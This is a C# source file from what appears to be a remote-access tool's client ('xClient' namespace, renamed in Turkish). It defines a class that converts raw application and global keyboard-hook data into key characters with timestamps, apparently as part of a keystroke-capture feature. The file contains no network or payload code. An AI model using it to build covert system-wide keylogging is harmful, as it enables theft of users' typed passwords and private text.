using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using xClient.KuuhakuÇekirdek.MouseKeyHook.WinApi;

namespace xClient.KuuhakuÇekirdek.MouseKeyHook
{
    public class EventArgsExtTuşBasımı : KeyPressEventArgs
    {
        internal EventArgsExtTuşBasımı(char keyChar, int timestamp)
            : base(keyChar)
        {
            IsNonChar = keyChar == (char) 0x0;
            Timestamp = timestamp;
        }

        public EventArgsExtTuşBasımı(char keyChar)
            : this(keyChar, Environment.TickCount)
        {
        }

        public bool IsNonChar { get; private set; }
        public int Timestamp { get; private set; }

        internal static IEnumerable<EventArgsExtTuşBasımı> FromRawDataApp(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;


            const uint maskKeydown = 0x40000000;
            const uint maskKeyup = 0x80000000;
            const uint maskScanCode = 0xff0000;

            var flags = (uint) lParam.ToInt64();
            var wasKeyDown = (flags & maskKeydown) > 0;
            var isKeyReleased = (flags & maskKeyup) > 0;

            if (!wasKeyDown && !isKeyReleased)
            {
                yield break;
            }

            var virtualKeyCode = (int) wParam;
            var scanCode = checked((int) (flags & maskScanCode));
            const int fuState = 0;

            char[] chars;

            KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
            if (chars == null) yield break;
            foreach (var ch in chars)
            {
                yield return new EventArgsExtTuşBasımı(ch);
            }
        }

        internal static IEnumerable<EventArgsExtTuşBasımı> FromRawDataGlobal(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;

            if ((int) wParam != Messages.WM_KEYDOWN)
            {
                yield break;
            }

            var keyboardHookStruct =
                (KeyboardHookStruct) Marshal.PtrToStructure(lParam, typeof (KeyboardHookStruct));

            var virtualKeyCode = keyboardHookStruct.VirtualKeyCode;
            var scanCode = keyboardHookStruct.ScanCode;
            var fuState = keyboardHookStruct.Flags;

            if (virtualKeyCode == KeyboardNativeMethods.VK_PACKET)
            {
                var ch = (char) scanCode;
                yield return new EventArgsExtTuşBasımı(ch, keyboardHookStruct.Time);
            }
            else
            {
                char[] chars;
                KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
                if (chars == null) yield break;
                foreach (var current in chars)
                {
                    yield return new EventArgsExtTuşBasımı(current, keyboardHookStruct.Time);
                }
            }
        }
    }
}